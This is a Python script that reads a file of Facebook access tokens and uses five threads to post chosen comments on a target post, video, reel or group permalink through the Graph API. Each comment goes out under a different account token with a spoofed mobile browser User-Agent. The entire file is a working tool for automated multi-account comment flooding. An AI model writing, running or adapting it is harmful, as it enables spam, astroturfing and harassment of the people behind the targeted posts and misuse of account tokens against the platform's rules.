from rich.console import Console
import requests
import threading

console = Console()

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def linktradio(post_link):
    try:
        if 'photo.php?fbid=' in post_link:
            post_id = post_link.split('fbid=')[1].split('&')[0]
        elif '/posts/' in post_link:
            post_id = post_link.split('/posts/')[1].split('/')[0]
        elif '/videos/' in post_link:
            post_id = post_link.split('/videos/')[1].split('/')[0].split('?')[0]
        elif '/reel/' in post_link:
            post_id = post_link.split('/reel/')[1].split('/')[0].split('?')[0]
        elif '/groups/' in post_link and '/permalink/' in post_link:
            post_id = post_link.split('/permalink/')[1].split('/')[0].split('?')[0]
        else:
            console.print("Invalid post, video, reel, or group permalink link.", style="bold red")
            return None
        return post_id
    except IndexError:
        console.print("Could not extract post, video, reel, or permalink ID.", style="bold red")
        return None

def comment_on_post(post_id, access_token, comment_text):
    try:
        url = f'https://graph.facebook.com/v19.0/{post_id}/comments'
        headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'}
        params = {'access_token': access_token, 'message': comment_text}
        response = requests.post(url, headers=headers, params=params)
        if response.status_code == 200:
            console.print(f"Success: Commented on {post_id}.", style="bold green")
            return True
        else:
            console.print(f"Failed to comment. Post ID: {post_id}", style="bold red")
    except requests.exceptions.RequestException:
        console.print(f"Failed to comment. Post ID: {post_id}", style="bold red")
    return False

def threaded_commenting(post_id, access_tokens, comment_texts, num_comments):
    successful_comments = 0
    used_indices = set()  # Keep track of used tokens
    lock = threading.Lock()  # Ensure thread safety for shared variables

    def worker():
        nonlocal successful_comments
        while True:
            with lock:
                if successful_comments >= num_comments:
                    break
                # Find the next unused token
                for i in range(len(access_tokens)):
                    if i not in used_indices:
                        used_indices.add(i)
                        access_token = access_tokens[i]
                        break
                else:
                    break  # Exit if no unused tokens remain

                # Rotate through the provided comment scripts
                comment_text = comment_texts[successful_comments % len(comment_texts)]

            # Perform the comment action
            if comment_on_post(post_id, access_token, comment_text):
                with lock:
                    successful_comments += 1

    threads = []
    for _ in range(5):  # Number of threads
        thread = threading.Thread(target=worker)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    # Exact comments check
    if successful_comments < num_comments:
        console.print(f"Could not reach the exact target. Only {successful_comments}/{num_comments} comments were made.", style="bold red")
    else:
        console.print(f"Target achieved: {successful_comments}/{num_comments} comments.", style="bold green")

def main():
    access_tokens = get_ids_tokens('/sdcard/Test/toka.txt')
    post_link = input('Enter the Facebook post, video, reel, or group permalink link: ')
    post_id = linktradio(post_link)

    if post_id is None:
        return

    num_comments = int(input("How many comments do you want to make? "))
    num_scripts = int(input('How many different comment scripts do you want to enter? '))
    comment_texts = [input(f'Enter comment script {i + 1}: ') for i in range(num_scripts)]

    threaded_commenting(post_id, access_tokens, comment_texts, num_comments)

if __name__ == '__main__':
    main()
